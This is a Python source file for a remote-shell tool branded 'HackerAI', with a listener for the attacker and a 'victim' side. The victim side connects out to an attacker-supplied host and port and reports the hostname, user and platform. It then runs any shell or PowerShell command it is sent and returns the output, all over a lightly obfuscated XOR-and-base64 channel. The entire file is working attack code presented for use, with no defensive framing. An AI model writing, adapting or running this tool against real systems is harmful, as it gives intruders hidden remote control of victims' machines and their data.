#!/usr/bin/env python3
"""
HackerAI Remote Shell — works on both listener and target
"""

import sys, os, socket, subprocess, json, base64, shlex, platform, signal
from pathlib import Path
from datetime import datetime

#     OBFUSCATION    
class Crypt:
    def __init__(self, key=b'H4ck3rA1_2026!!'):
        self.key = key[:32].ljust(32, b'\x00')
    def encrypt(self, data: bytes) -> bytes:
        return base64.b64encode(bytes([b ^ self.key[i % 32] for i, b in enumerate(data)]))
    def decrypt(self, data: bytes) -> bytes:
        raw = base64.b64decode(data)
        return bytes([b ^ self.key[i % 32] for i, b in enumerate(raw)])

crypt = Crypt()

#     PARSE ARGS MANUALLY (no argparse errors)    
LHOST = "0.0.0.0"
LPORT = 4444
LISTEN = False

i = 1
while i < len(sys.argv):
    a = sys.argv[i].upper()
    if a.startswith("LHOST="):
        LHOST = sys.argv[i].split("=", 1)[1]
    elif a.startswith("LPORT="):
        LPORT = int(sys.argv[i].split("=", 1)[1])
    elif a in ("--lhost",):
        i += 1; LHOST = sys.argv[i]
    elif a in ("--lport",):
        i += 1; LPORT = int(sys.argv[i])
    elif a in ("--listen", "-l"):
        LISTEN = True
    i += 1

#     SEND / RECV    
def send_msg(sock, msg):
    sock.send(crypt.encrypt(json.dumps(msg).encode()) + b'\n')

def recv_msg(sock):
    buf = b''
    while b'\n' not in buf:
        c = sock.recv(65536)
        if not c: raise ConnectionError()
        buf += c
    line = buf.split(b'\n', 1)[0]
    return json.loads(crypt.decrypt(line).decode())

#     LISTENER (attacker)    
def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', LPORT))
    s.listen(1)
    print(f"[*] Listening on 0.0.0.0:{LPORT}")
    print(f"[*] Target should run: python3 shell.py LHOST={LHOST} LPORT={LPORT}")
    print("[*] Waiting for target...")
    client, addr = s.accept()
    print(f"[+] Connected from {addr}")

    # Get initial info
    msg = recv_msg(client)
    print(f"[remote] {msg.get('data', '')}")

    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            send_msg(client, {"type": "exit", "data": ""})
            break

        if not cmd: continue
        if cmd.lower() in ("exit", "quit"):
            send_msg(client, {"type": "exit", "data": ""})
            break
        if cmd.lower() == "help":
            print("Commands: any shell command, cd <dir>, exit")
            continue

        if cmd.lower().startswith("cd "):
            send_msg(client, {"type": "cd", "data": cmd[3:]})
        else:
            send_msg(client, {"type": "cmd", "data": cmd})

        try:
            resp = recv_msg(client)
            print(resp.get("data", ""))
        except:
            print("[!] Connection lost")
            break

    client.close()
    s.close()

#     VICTIM / TARGET    
def victim():
    import platform as pf
    cwd = Path.cwd()
    retries = 0
    while retries < 3:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            print(f"[*] Connecting to {LHOST}:{LPORT}...")
            s.connect((LHOST, LPORT))
            print("[+] Connected!")
            break
        except Exception as e:
            retries += 1
            if retries >= 3:
                print(f"[!] Failed after 3 tries: {e}")
                sys.exit(1)
            print(f"[!] Retry {retries}/3...")
            time.sleep(2)
    else:
        return

    info = json.dumps({
        "hostname": socket.gethostname(),
        "platform": pf.platform(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
        "cwd": str(cwd)
    })
    send_msg(s, {"type": "msg", "data": info})

    while True:
        try:
            msg = recv_msg(s)
        except:
            break

        t = msg.get("type", "cmd")
        d = msg.get("data", "")

        if t == "exit":
            break
        elif t == "cd":
            try:
                p = Path(d).expanduser().resolve()
                os.chdir(p); cwd = p
                send_msg(s, {"type": "msg", "data": f"[OK] cd -> {cwd}"})
            except Exception as e:
                send_msg(s, {"type": "msg", "data": f"[ERR] cd: {e}"})
        else:
            try:
                if os.name == "nt":
                    proc = subprocess.run(["powershell", "-Command", d], capture_output=True, text=True, timeout=30)
                else:
                    proc = subprocess.run(d, shell=True, capture_output=True, text=True, timeout=30)
                out = proc.stdout + proc.stderr
                send_msg(s, {"type": "msg", "data": out if out else "[OK] (done)"})
            except subprocess.TimeoutExpired:
                send_msg(s, {"type": "msg", "data": "[ERR] timeout (30s)"})
            except Exception as e:
                send_msg(s, {"type": "msg", "data": f"[ERR] {e}"})

    s.close()

#     MAIN    
import time  # needed for retry sleep

if LISTEN:
    listener()
else:
    victim()
